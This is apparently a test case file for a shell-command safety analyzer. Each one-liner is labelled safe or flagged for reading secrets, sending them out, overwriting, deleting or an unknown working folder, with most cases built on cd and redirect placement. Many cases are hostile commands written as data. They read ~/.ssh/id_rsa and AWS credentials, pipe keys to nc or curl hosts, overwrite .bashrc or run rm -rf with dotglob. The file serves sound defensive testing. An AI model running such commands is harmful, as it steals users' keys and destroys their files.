# A redirect on a group, a branch, a loop or a function call is opened before
# its body runs, so from the folder the line is in then, not from the one a
# `cd` in the body leaves it in. A `cd` in the body that may not have run
# leaves the line in a folder that is not certain. The format is in
# CONTRIBUTING.md.

# A redirect on a group, a branch or a loop is placed from where it starts.
# The key is not at the end of `../..` from `sub`.
posix safe | { cd ../..; cat; } < .ssh/id_rsa
posix safe | { cd ../..; } < .ssh/id_rsa
posix safe | { cd ../..; ls; } < .ssh/id_rsa
posix safe | { cd ~; cat; } < .ssh/id_rsa
posix safe | { cd sub; cat; } < ../x
posix safe | while read l; do cd ../..; done < .ssh/id_rsa
posix safe | if true; then cd ../..; fi < .ssh/id_rsa
posix safe | for x in 1; do cd ../..; done < .ssh/id_rsa
posix safe | while read l; do cd sub; done < ../x
posix safe | if true; then cd sub; fi < ../x
posix safe | case x in x) cd ../..;; esac < .ssh/id_rsa
# A group that does not move the line.
posix safe | { ls; } < ../x
# A subshell was already read this way.
posix safe | (cd sub; cat) < ../x
# The commands after the group, and the ones in it, are placed from where the
# line is then: where the `cd` went, and, when it may have failed, where the
# line was.
posix safe | { cd sub; } && cat < ../../.ssh/id_rsa
posix safe | { cd sub && cat < ../../.ssh/id_rsa; }
posix finds=read_secret | { cd sub; }; cat < ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; cat < ../../.ssh/id_rsa; }
# After a `cd` the group starts in the folder it went to.
posix safe | cd a && { cd b; } < ../../.ssh/id_rsa
posix finds=read_secret | cd a; { cd b; } < ../../.ssh/id_rsa
# A file in the folder the line is in is inside the workspace.
posix safe | { cd ../..; ls; } > x
posix safe | { cd ../..; } > x
posix safe | { cd ../..; } >> x
posix safe | for x in 1; do cd ../..; done > x
posix safe | while read l; do cd ../..; done > x
posix safe | if true; then cd ../..; fi > x
posix safe | { cd sub; ls; } > out.txt
posix safe | { ls; } > out.txt 2> out2.txt
posix finds=read_secret | { cd sub; cat; } < ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; } < ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; } 0< ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; } <> ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; cd sub2; } < ../../.ssh/id_rsa
posix finds=read_secret | { ls; cd sub; } < ../../.ssh/id_rsa
posix finds=read_secret | { { cd sub; }; } < ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; } < ../../.ssh/id_rsa < ../x
posix finds=read_secret | { cd sub; } < ../x < ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; } < ../../.ssh/id_rsa | cat
posix finds=read_secret | { cd sub; } < ../../.ssh/id_rsa && ls
posix finds=read_secret | ls; { cd sub; } < ../../.ssh/id_rsa
posix finds=read_secret | ls && { cd sub; } < ../../.ssh/id_rsa
posix finds=read_secret | { cd sub; } < ~/.ssh/id_rsa
# A subshell, as before.
posix finds=read_secret | (cd sub) < ../../.ssh/id_rsa
# After a `cd`, the folder the group starts in is that one.
posix finds=read_secret | cd a; { cd b; } < ../../../.ssh/id_rsa
posix finds=read_secret | { cd a; { cd b; } < ../../../.ssh/id_rsa; }
posix finds=read_secret | { cd sub; } <<EOF < ../../.ssh/id_rsa\nx\nEOF
posix finds=read_secret | { cd sub; } <<-EOF < ../../.ssh/id_rsa\nx\nEOF
# A loop or a branch.
posix finds=read_secret | while read l; do cd sub; done < ../../.ssh/id_rsa
posix finds=read_secret | until false; do cd sub; done < ../../.ssh/id_rsa
posix finds=read_secret | for x in 1; do cd sub; done < ../../.ssh/id_rsa
posix finds=read_secret | for ((i = 0; i < 1; i++)); do cd sub; done < ../../.ssh/id_rsa
posix finds=read_secret | if true; then cd sub; fi < ../../.ssh/id_rsa
posix finds=read_secret | if true; then ls; else cd sub; fi < ../../.ssh/id_rsa
posix finds=read_secret | case x in x) cd sub;; esac < ../../.ssh/id_rsa
posix finds=read_secret | while read l; do cd sub; done < ../../.ssh/id_rsa | cat
posix finds=read_secret | ls || if true; then cd sub; fi < ../../.ssh/id_rsa
# A write.
posix finds=overwrite | { cd sub; ls; } > ../x
posix finds=overwrite | { cd sub; } > ../x
posix finds=overwrite | { cd sub; } >> ../x
posix finds=overwrite | { cd sub; } 2> ../x
posix finds=overwrite | { cd sub; } &> ../x
posix finds=overwrite | for x in 1; do cd sub; done > ../x
posix finds=overwrite | while read l; do cd sub; done > ../x
posix finds=overwrite | if true; then cd sub; fi > ../x
posix finds=overwrite | case x in x) cd sub;; esac > ../x
posix finds=overwrite | { cd sub; } > ../x | cat
posix finds=overwrite | (cd sub) > ../x
posix finds=overwrite | { cd sub; } <<EOF > ../x\nx\nEOF

# A redirect on a group in a loop or after a cd that may not run is placed
# from both folders.
# The first pass starts where the line is, the next where the last one left
# it (`..` of `sub`, here the repository).
posix finds=read_secret | for i in 1 2; do { cd sub; } < ../../.ssh/id_rsa; done
# The first `cd` may not have run, and the line is then where it began.
posix finds=read_secret | ls || cd a; { cd b; } < ../../.ssh/id_rsa
posix finds=read_secret | ls || { cd sub; } < ../../.ssh/id_rsa
posix finds=read_secret | f() { { cd sub; } < ../../.ssh/id_rsa; }; f
posix finds=read_secret | if true; then { cd sub; } < ../../.ssh/id_rsa; fi

# A redirect on a list that ends in a group is placed from where the last
# command starts.
# The group starts in `sub`, where the key is not.
posix safe | cd sub && { cat; } < ../../.ssh/id_rsa
# It writes inside the workspace.
posix safe | cd frontend && { cd sub; make; } > ../build.log
# A pipeline's last stage starts where the pipeline starts.
posix safe | cd ~ | { cat; } < .ssh/id_rsa
# Nothing before the group moves the line.
posix safe | ls && { cat; } < ../x
posix safe | ls && { cd sub; cat; } < ../x
posix finds=read_secret | cd ~ && { cat; } < .ssh/id_rsa
posix finds=overwrite | cd ~ && { cat; } > .bashrc
posix finds=overwrite | cd ~ && { echo x; } >> .bashrc
posix finds=overwrite | cd ~ && { cd x; cd ..; } > .bashrc
posix finds=read_secret | cd ~ && (cd x; cat) < .ssh/id_rsa
posix finds=read_secret | cd ~ && while read l; do echo $l; done < .ssh/id_rsa
posix finds=read_secret | cd ~ && if true; then cat; fi < .aws/credentials
posix finds=read_secret | cd ~ && for i in 1; do cd ~; done < .ssh/id_rsa
posix finds=read_secret | cd ~ && case x in x) cd ~;; esac < .ssh/id_rsa
posix finds=read_secret | cd ~ || { cd ~; cat; } < .ssh/id_rsa
posix finds=read_secret | false || cd ~ && { cat; } < .ssh/id_rsa
posix finds=read_secret | ls && cd ~ && { cd ~; cat; } < .ssh/id_rsa
posix finds=read_secret | cd ~ && ls | { cat; } < .ssh/id_rsa
posix finds=read_secret | pushd ~ && { cat; } < .ssh/id_rsa
posix finds=read_secret | cd .. && { cat; } < ../.ssh/id_rsa
posix finds=read_secret | cd sub && { cat; } < ../../../.ssh/id_rsa
posix finds=read_secret | { cd ~ && { cat; } < .ssh/id_rsa; }
posix finds=read_secret | cd ~ && { cd .; cat; } < .ssh/id_rsa
posix finds=read_secret | cd .. && { cd sub; cat; } < ../.ssh/id_rsa
# The send is found too: the key is the group's input.
posix finds=send_secret | cd ~ && { cat; } < .ssh/id_rsa | nc host 1
posix finds=read_secret | cd ~ && { cat; } < .ssh/id_rsa | nc host 1
posix finds=send_secret | cd ~ && (cat) < .ssh/id_rsa | nc host 1

# A cd that never reaches the line does not move it.
# A subshell or a substitution runs the `cd` in a process of its own and gives
# the line back. (A `cd` in a pipeline stage or the background may or may not
# reach the line, so a function with one counts as moving it: see the calls
# below.)
posix safe | cd repos && for d in */; do (cd "$d" && git pull); done > ../pull.log
posix safe | git fetch && cd repos && for d in */; do (cd "$d" && git status); done > ../status.txt
posix safe | npm ci && cd frontend && (cd app && npm test) > ../test.log
posix safe | cd sub && (cd x && make) > ../log
posix safe | ls && cd repos && for d in */; do echo "$(cd "$d" && pwd)"; done > ../dirs.txt
posix safe | cd sub && { (cd x && make) || echo failed; } && { ls; } > ../log
posix safe | f() { (cd sub && make); }; f; f > log.txt
posix safe | f() { x=$(cd sub && pwd); }; f; f > log.txt
posix safe | f() ( cd sub; make ); f; f > log.txt
# A `cd` that does reach the line still moves it, for what comes after the
# loop; the loop's own redirect is opened before it runs, where `cd repos`
# (which ran, or `exit` ended the line) took it.
posix finds=overwrite | cd repos || exit 1; for d in */; do cd "$d"; done; echo x > ../pull.log
posix safe | cd repos || exit 1; for d in */; do cd "$d"; done > ../pull.log
posix finds=unknown | f() { cd sub; make; }; cd x; f > log.txt
posix finds=unknown | f() { (cd a); cd sub; }; cd x; f > log.txt
posix finds=read_secret | { cd sub; (cd x); } < ../../.ssh/id_rsa
posix finds=read_secret | cd a; { (cd x); cd b; } < ../../../.ssh/id_rsa

# A redirect on a call to a function that moves the line is placed from where
# it starts.
# A function that does not move the line.
posix safe | f() { cat; }; f < ../x
posix safe | f() { (cd sub; cat); }; f < ../x
# The function is not called.
posix safe | f() { cd sub; cat; }; cat < ../x
# Nothing has moved the line since the definition, and the function has not
# been called before.
posix safe | f() { cd sub; cat; }; f < ../x
posix safe | cd a; f() { cd sub; }; f < ../x
posix safe | f() { cd sub; }; { f; } < ../x
# A redirect that names no file by folder: the call may be made anywhere.
posix safe | run() { cd "$1" && npm test; }; run a 2>&1; run b 2>&1
posix safe | t() { cd "$1" && cargo test; }; t a 2>&1 | tail; t b 2>&1 | tail
posix safe | run() { cd "$1" && npm test; }; run a > /dev/null; run b > /dev/null
posix safe | f() { cd sub; }; cd x; f 2>/dev/null
posix safe | b() { cd app && make; }; cd ..; b > /tmp/log
posix safe | build() { cd app && make; }; build; build 2>&1 | tee log
posix safe | f() { cd sub; }; f; f < /dev/null
posix safe | f() { cd sub; }; f; f >&2
posix safe | f() { cd sub; }; f; f >&-
posix safe | f() { cd sub; }; f; { f; } 2>&1
posix safe | f() { cd sub; }; f; if true; then f; fi > /dev/null
posix finds=read_secret | f() { cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub; }; f < ../../.ssh/id_rsa
posix finds=read_secret | function f { cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() ( cd sub; cat ); f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub; }; command f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub; }; f < ../../.ssh/id_rsa | cat
posix finds=read_secret | f() { cd sub; }; true && f < ../../.ssh/id_rsa
# In a group that is redirected.
posix finds=read_secret | f() { cd sub; }; { f; cat; } < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub; }; { f; } < ../../.ssh/id_rsa
# Called twice: the second call starts where the first left the line.
posix finds=read_secret | f() { cd sub; }; f; f < ../../../.ssh/id_rsa
posix finds=overwrite | f() { cd sub; }; f > ../x
# A `cd` between the definition and the call: the walk applied the body's `cd`
# once, at the definition, so neither the folder of the definition nor where
# the walk's line is can be the one. Each of these reads
# /home/me/.ssh/id_rsa from /home/me/work/repo.
posix finds=unknown | f() { cd sub; cat; }; cd x; f < ../../../.ssh/id_rsa
posix finds=unknown | f() { cd sub; cat; }; cd ..; f < ../.ssh/id_rsa
posix finds=unknown | f() { cd sub; cat; }; cd x; { f; } < ../../../.ssh/id_rsa
# The function was called before, so the line is not where the definition was
# read.
posix finds=unknown | f() { cd sub; cat; }; f; f; f < ../../../../.ssh/id_rsa
posix finds=unknown | f() { cd sub; }; f; f > ../x
# A function that calls one that moves the line moves it too.
posix finds=unknown | f() { cd sub; }; g() { f; }; g; g < ../../../.ssh/id_rsa
# The line was not surely where the definition was read.
posix finds=unknown | ls || cd a; f() { cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | ls || cd a; f() { cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=unknown | if x; then cd a; fi; f() { cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | if x; then cd a; fi; f() { cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=unknown | for i in 1 2; do f() { cd sub; cat; }; f < ../../.ssh/id_rsa; done
# A call in a loop starts where the last pass left the line.
posix finds=unknown | f() { cd sub; }; for i in 1 2; do f < ../../.ssh/id_rsa; done
# A name relative to the folder still is.
posix finds=unknown | f() { cd sub; }; f; f > log.txt
posix finds=unknown | f() { cd sub; }; cd x; f 2>&1 > log.txt
posix finds=unknown | f() { cd sub; }; cd x; f > /dev/null < in.txt
posix finds=unknown | f() { cd sub; }; f; f <<EOF > log.txt\nx\nEOF
posix finds=unknown | f() { cd sub; cat; }; cd x; f 2>&1 < ../../../.ssh/id_rsa

# A cd behind a wrapper, in the background or in a stage still makes the
# function one that moves the line. `command`, `builtin` and `time` run the
# `cd` in this shell, and zsh runs the last stage of a pipeline in this shell
# too, so the body moves the line. The call opens its redirect from the folder
# of the call, which is the folder of the definition (/home/me/work/repo).
# For `env`, `nohup`, the background and the other stages, the walk moves its
# own line for each of these `cd`s, so the call is placed from the folder of
# the definition too, where the redirect really opens.
posix finds=read_secret | f() { command cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { builtin cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { time cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { ls | cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cat | while read l; do cd sub; done; }; f < ../../.ssh/id_rsa
posix finds=overwrite | f() { command cd sub; }; f > ../x
posix finds=overwrite | f() { builtin cd sub; ls; }; f > ../x
posix finds=unknown | f() { command cd ..; }; f; f; f < .ssh/id_rsa
posix finds=unknown | f() { builtin cd sub; }; f; f > log.txt
posix finds=unknown | f() { command cd sub; }; cd x; f > log.txt
posix finds=read_secret | f() { env cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { nohup cd sub; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub & cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub | cat; cat; }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub & }; f < ../../.ssh/id_rsa
posix finds=read_secret | f() { cd sub | cat; }; f < ../../.ssh/id_rsa
posix finds=unknown | f() { env cd sub; }; f; f < ../../.ssh/id_rsa
posix finds=overwrite | f() { cd sub & }; f > ../x
posix finds=overwrite | f() { env cd sub; }; f > ../x
# Called twice, the second call may start anywhere.
posix finds=unknown | f() { cd sub | cat; }; f; f > log.txt
posix finds=unknown | f() { cd sub & }; f; f > log.txt

# A redirect on a function definition is opened at each call from where it was
# defined.
# A file the call reaches from the folder the line is in.
posix safe | f() { cd sub; ls; } > out.txt; f
posix safe | f() { echo hi; } > out.txt; f
posix safe | f() { echo hi; } > out.txt; f; f
posix safe | f() { cat; } < ../x; f
# Not named by a folder: the call may be made anywhere.
posix safe | f() { echo hi; } > /dev/null 2>&1; cd src; f
posix safe | f() { echo hi; } > /home/me/work/repo/out.txt; cd src; f
posix safe | f() { echo hi; } 2>&1; cd src; f
# A function that is not called.
posix safe | f() { echo hi; } > out.txt; cd src
posix safe | cd src; f() { echo hi; } > out.txt; f
# The body's `cd` does not move where the redirect is opened.
posix finds=read_secret | f() { cd sub; cat; } < ../../.ssh/id_rsa; f
posix finds=read_secret | function f { cd sub; cat; } < ../../.ssh/id_rsa; f
posix finds=read_secret | f() ( cd sub; cat ) < ../../.ssh/id_rsa; f
posix finds=overwrite | f() { cd sub; ls; } > ../x; f
posix finds=overwrite | f() { cd sub; ls; } >> ../x; f
posix finds=overwrite | f() { cd sub; ls; } 2> ../x; f
posix finds=overwrite | f() { cd sub; } > ../x; f
posix finds=overwrite | function f { cd sub; ls; } > ../x; f
posix finds=overwrite | cd a; f() { cd sub; ls; } > ../../x; f
# The folder the call is made in is not the one the line is in where the
# function is defined.
posix finds=unknown | f() { echo hi; } > out.txt; cd src; f
posix finds=unknown | f() { cat; } < ../.ssh/id_rsa; cd ..; f
posix finds=unknown | f() { cd sub; } > out.txt; f; f
posix finds=unknown | f() { echo hi; } > out.txt; for d in a b; do f; cd $d; done
posix finds=unknown | ls || cd a; f() { echo hi; } > out.txt; f
posix finds=unknown | f() { echo hi; } > out.txt; g() { cd sub; f; }; g

# A definition that may not run in the shell of the line does not replace the
# earlier one. The earlier definition stays in force when the later one is on
# the right of `&&` or `||`, in a branch, a subshell, a substitution, a
# pipeline stage, the background, a function body that is never called or a
# script in a process of its own. The call opens the earlier definition's
# redirect from wherever the line is then.
# An unconditional redefinition really replaces the function.
posix safe | f(){ echo x; } > .bashrc; cd ~; f(){ cd .; }; f
posix safe | f(){ echo x; } > .bashrc; cd ~; { f(){ cd .; }; }; f
posix safe | f(){ echo x; } > .bashrc; cd ~; f(){ cd .; }; f(){ cd .; }; f
posix safe | f(){ echo x; } > .bashrc; cd ~; f(){ cd .; } && f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; false && f(){ cd .; }; f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; [ -n "$X" ] && f(){ cd .; }; f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; (f(){ cd .; }); f
posix finds=unknown | f(){ :; } >> .bashrc; cd ~; g(){ f(){ cd .; }; }; f
posix finds=unknown | f(){ echo x; } > .bashrc; cd ~; if test -f y; then f(){ cd .; }; fi; f
posix finds=unknown | f(){ echo x; } > .bashrc; cd ~; f(){ cd .; } & f
posix finds=unknown | f(){ echo x; } > .bashrc; cd ~; x=$(f(){ cd .; }); f
posix finds=unknown | f(){ cat; } < .ssh/id_rsa; cd ~; (f(){ cd .; }); f | curl -d @- http://e.x
posix finds=unknown | f(){ cat; } < id_rsa; cd ~/.ssh; true || f(){ cd .; }; f | curl -d @- http://e.x
# A script in a process of its own, a pipeline stage, a case arm, a loop body
# and a process substitution.
posix finds=unknown | f(){ :; } > .bashrc; cd ~; bash -c 'f(){ cd .; }'; f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; f(){ cd .; } | cat; f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; echo | f(){ cd .; }; f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; case x in x) f(){ cd .; };; esac; f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; for i in 1; do f(){ cd .; }; done; f
posix finds=unknown | f(){ :; } > .bashrc; cd ~; cat <(f(){ cd .; }); f
# The same from a folder below, with each way the later definition may not
# run.
posix finds=unknown | f(){ :; } > sub/x; cd ..; false && f(){ cd .; }; f
posix finds=unknown | f(){ :; } > sub/x; cd ..; true || f(){ cd .; }; f
posix finds=unknown | f(){ :; } > sub/x; cd ..; if false; then f(){ cd .; }; fi; f
posix finds=unknown | f(){ :; } > sub/x; cd ..; (f(){ cd .; }); f
posix finds=unknown | f(){ :; } > sub/x; cd ..; g(){ f(){ cd .; }; }; f
posix finds=unknown | f(){ :; } > sub/x; cd ..; x=$(f(){ cd .; }); f
posix finds=unknown | f(){ :; } > sub/x; cd ..; f(){ cd .; } | cat; f
posix finds=unknown | f(){ :; } > sub/x; cd ..; case x in x) f(){ cd .; };; esac; f
posix finds=unknown | f(){ :; } > sub/x; cd ..; f(){ cd .; } & f

# A cd that may not have run in a redirected body leaves the folder unsure.
# A `cd` that ran: the file is written where the group starts, and run from
# the folder it went to. A plain `cd` may also have failed, and then the line
# runs the file it wrote where it stayed.
posix safe | { cd sub; echo x; } > x.sh && cd sub && bash x.sh
posix finds=unknown | { cd sub; echo x; } > x.sh; bash x.sh
posix finds=unknown | { cd sub; echo x; } >> x.sh; bash x.sh
posix finds=unknown | { cd sub && echo x; } > x.sh; bash x.sh
# An `exit` after it ends the shell when it failed.
posix safe | { echo x; cd sub || exit; } > x.sh; bash x.sh
posix finds=unknown | { cd sub; cd sub2; echo x; } > x.sh; bash x.sh
posix finds=unknown | ls; { cd sub; echo x; } > x.sh; bash x.sh
posix finds=unknown | if true; then cd sub; fi > x.sh; bash x.sh
posix finds=unknown | if :; then cd sub; fi > x.sh; bash x.sh
# A body that does not move the line.
posix safe | { echo x; } > x.sh; cat x.sh
posix safe | if test -d sub; then echo x; fi > x.sh; cat x.sh
posix safe | for i in a b; do echo x; done > x.sh; cat x.sh
# The file is not run.
posix safe | if false; then cd sub; else echo x; fi > x.sh; cat x.sh
posix safe | { echo x; false && cd sub; } > x.sh; cat x.sh
# Written and run somewhere else.
posix safe | if false; then cd sub; else echo x; fi > x.sh; bash y.sh
posix safe | if false; then cd sub; else echo x; fi > x.sh; bash sub/y.sh
# The run is after a `cd` that surely ran, from a folder the file was not
# written in.
posix safe | { echo x; false && cd sub; } > x.sh; cd other && bash x.sh
# After the group the line may be where it began or where the `cd` took it: a
# later `cd` and run is judged from both. From either folder, these run a file
# the line did not write.
posix safe | { echo x; false && cd sub; } > x.sh; cd sub && bash x.sh
# A plain `cd` may fail and leave the line where the file was written.
posix finds=unknown | { echo x; false && cd sub; } > x.sh; cd other; bash x.sh
posix finds=unknown | { echo x; false && cd sub; } > x.sh; cd sub; bash x.sh
posix safe | { echo x; false && cd sub; } > x.sh; bash sub/x.sh
posix safe | { echo x; cd sub; } > x.sh; bash sub/x.sh
# Everyday lines that do not run what they wrote.
posix safe | if test -d build; then cd build; fi > /dev/null; make
posix safe | if [ -d build ]; then cd build; fi > log.txt; make; cat log.txt
posix safe | for d in a b; do cd $d; make; cd ..; done > log.txt; cat log.txt
posix safe | for d in a b; do (cd $d; make); done > log.txt; cat log.txt
posix finds=unknown | if false; then cd sub; else echo x; fi > x.sh; bash x.sh
posix finds=unknown | if test -d sub; then cd sub; else echo x; fi > x.sh; bash x.sh
posix finds=unknown | case y in x) cd sub;; *) echo x;; esac > x.sh; bash x.sh
posix finds=unknown | { echo x; false && cd sub; } > x.sh; bash x.sh
posix finds=unknown | { echo x; [ -d sub ] && cd sub; } > x.sh; bash x.sh
posix finds=unknown | { echo x; cd sub || true; } > x.sh; bash x.sh
posix finds=unknown | for i in $list; do cd sub; echo x; done > x.sh; bash x.sh
posix finds=unknown | while read l; do echo x; cd sub; done < in.txt > x.sh; bash x.sh
# The same at the top level, as before.
posix finds=unknown | if false; then cd sub; fi; echo x > x.sh; bash x.sh
# Every way the file is written and run.
posix finds=unknown | if false; then cd sub; fi > x.sh; bash x.sh
posix finds=unknown | if false; then cd sub; else echo x; fi >> x.sh; bash x.sh
posix finds=unknown | if false; then cd sub; else echo x; fi > x.sh; ./x.sh
posix finds=unknown | if false; then cd sub; else echo x; fi > x.sh; sh ./x.sh
posix finds=unknown | if false; then cd sub; else echo x; fi > x.sh; source x.sh
posix finds=unknown | if false; then cd sub; else echo x; fi > x.sh; . ./x.sh
# Every kind of body.
posix finds=unknown | if false; then echo x; else cd sub; fi > x.sh; bash x.sh
posix finds=unknown | if a; then echo x; elif b; then cd sub; fi > x.sh; bash x.sh
posix finds=unknown | case y in x) echo x;; *) cd sub;; esac > x.sh; bash x.sh
posix finds=unknown | { echo x; test -d sub && cd sub; } > x.sh; bash x.sh
posix finds=unknown | { echo x; cd sub || cd other; } > x.sh; bash x.sh
posix finds=unknown | { { echo x; false && cd sub; }; } > x.sh; bash x.sh
posix finds=unknown | { echo x; if false; then cd sub; fi; } > x.sh; bash x.sh
posix finds=unknown | { echo x; false && cd sub; echo y; } > x.sh; bash x.sh
posix finds=unknown | until false; do echo x; cd sub; done > x.sh; bash x.sh
posix finds=unknown | while false; do cd sub; done > x.sh; bash x.sh
posix finds=unknown | for ((i = 0; i < 3; i++)); do echo x; cd sub; done > x.sh; bash x.sh
posix finds=unknown | select x in a; do cd sub; done > x.sh; bash x.sh
# More than one redirect, and a here-document.
posix finds=unknown | if false; then cd sub; else echo x; fi 2> err > x.sh; bash x.sh
posix finds=unknown | if false; then cd sub; else echo x; fi > x.sh 2> err; bash x.sh
posix finds=unknown | { echo x; false && cd sub; } <<EOF > x.sh\nin\nEOF\nbash x.sh
posix finds=unknown | { echo x; false && cd sub; } &> x.sh; bash x.sh
# After a list, a branch or a loop earlier on the line.
posix finds=unknown | ls; { echo x; false && cd sub; } > x.sh; bash x.sh
posix finds=unknown | ls && { echo x; false && cd sub; } > x.sh; bash x.sh
posix finds=unknown | if a; then cd up; fi; { echo x; false && cd sub; } > x.sh; bash x.sh
# In a body that is itself redirected, or in a function.
posix finds=unknown | f() { { echo x; false && cd sub; } > x.sh; bash x.sh; }; f
posix finds=unknown | { { echo x; false && cd sub; } > x.sh; bash x.sh; }
# A write to a path with a folder in it.
posix finds=unknown | if false; then cd sub; else echo x; fi > sub/x.sh; bash sub/x.sh
# Only a condition that is `true` or `:` alone surely takes the branch.
posix finds=unknown | if true; then cd sub; else echo x; fi > x.sh; bash x.sh
posix finds=unknown | if true && false; then cd sub; fi > x.sh; bash x.sh
posix finds=unknown | if true; then echo x; elif a; then cd sub; fi > x.sh; bash x.sh
posix finds=unknown | true() { false; }; if true; then cd sub; fi > x.sh; bash x.sh
# From `sub`, `../x.sh` is the file written where the line began.
posix finds=unknown | if false; then cd sub; else echo x; fi > x.sh; bash ../x.sh
# The second `cd` runs only when the first did.
posix finds=unknown | { cd sub && cd sub2; echo x; } > x.sh; bash x.sh
# A subshell gives the line back, so the file is run where it is written (as
# before).
posix finds=unknown | (cd sub; echo x) > x.sh; bash x.sh
# A `cd` that surely ran: the group starts in the folder the line was in, so
# the file it writes is the one that is run after a `cd` back.
posix finds=unknown | { cd sub; echo x; } > x.sh; cd ..; bash x.sh
# From `sub`, `cd ..` goes back to where the file was written.
posix finds=unknown | { echo x; false && cd sub; } > x.sh; cd ..; bash x.sh
# From where the line began, `cd sub` makes `../x.sh` the file that was
# written.
posix finds=unknown | { echo x; false && cd sub; } > x.sh; cd sub; bash ../x.sh
# A later `cd` that may not have run leaves the line in yet another folder that
# is not certain: the run is judged from every one of them.
posix finds=unknown | { false && cd s; } > x0.sh; false && cd t; bash x0.sh
posix finds=unknown | { false && cd s; } > x0.sh; if false; then cd t; fi; bash x0.sh
posix finds=unknown | if false; then cd s; fi > a.sh; if false; then cd t; fi > b.sh; bash a.sh
posix finds=unknown | { false && cd s; } > x0.sh; { false && cd s; } > x1.sh; bash x0.sh
posix finds=unknown | { echo x; false && cd sub; } > x.sh && bash x.sh
posix finds=unknown | { echo x; false && cd sub; } > x.sh; bash x.sh &
posix finds=unknown | { echo x; false && cd /tmp; } > x.sh; bash x.sh
posix finds=unknown | { echo x; false && pushd sub; } > x.sh; bash x.sh
# A `cd` in a function the group calls.
posix finds=unknown | f() { false && cd sub; }; { echo x; f; } > x.sh; bash x.sh
posix finds=unknown | f() { cd sub; }; { echo x; false && f; } > x.sh; bash x.sh
# A `cd` in the background does not move the line, so the run is of the file
# the group wrote.
posix finds=unknown | { echo x; cd sub & } > x.sh; bash x.sh

# An if true is confined to the cd in its body. `if true` is no branch only
# for whether a `cd` in its body may not have run: for everything else (a
# later `cd`'s place, the dotglob option, a function definition) it is a
# branch, as on any `if`. And an alias, `enable` or `disable` can make `true`
# or `:` fail, or run another command, so after one the body may not run.
# The option turned off in the body of an `if true` is not counted on, as
# before.
posix finds=delete | shopt -s dotglob\nif true; then shopt -u dotglob; fi\nrm -rf *git
posix finds=delete | shopt -s dotglob; if true; then shopt -u dotglob; fi; rm -rf *git
posix finds=delete | setopt globdots; if true; then unsetopt globdots; fi; rm -rf *git
posix finds=delete | shopt -s dotglob; if :; then shopt -u dotglob; fi; rm -rf *git
# After a rename of the builtin.
posix finds=overwrite | alias true=false\nif true; then cd sub; fi\n{ cd ..; } > ../.bashrc
posix finds=overwrite | alias true=false\nif true; then cd sub; fi\ncd .. > ../.bashrc
posix finds=overwrite | alias :=false\nif :; then cd sub; fi\n{ cd ..; } > ../.bashrc
posix finds=overwrite | shopt -s expand_aliases\nalias true=false\nif true; then cd sub; fi\n{ cd ..; } > ../.bashrc
posix finds=overwrite | enable -n true; PATH=/x; if true; then cd sub; fi; { cd ..; } > ../.bashrc
posix finds=overwrite | disable true; PATH=/x; if true; then cd sub; fi; { cd ..; } > ../.bashrc
posix finds=delete | shopt -s dotglob\nalias true=false\nif true; then shopt -u dotglob; fi\nrm -rf *git
posix finds=delete | shopt -s dotglob\nalias :=false\nif :; then shopt -u dotglob; fi\nrm -rf *git
posix finds=delete | shopt -s dotglob; enable -n true; PATH=/x; if true; then shopt -u dotglob; fi; /bin/rm -rf *git
posix finds=delete | setopt globdots; disable true; PATH=/x; if true; then unsetopt globdots; fi; /bin/rm -rf *git
# The redirected file run later, with the alias.
posix finds=unknown | alias true=false; if true; then cd sub; fi > x.sh; bash x.sh
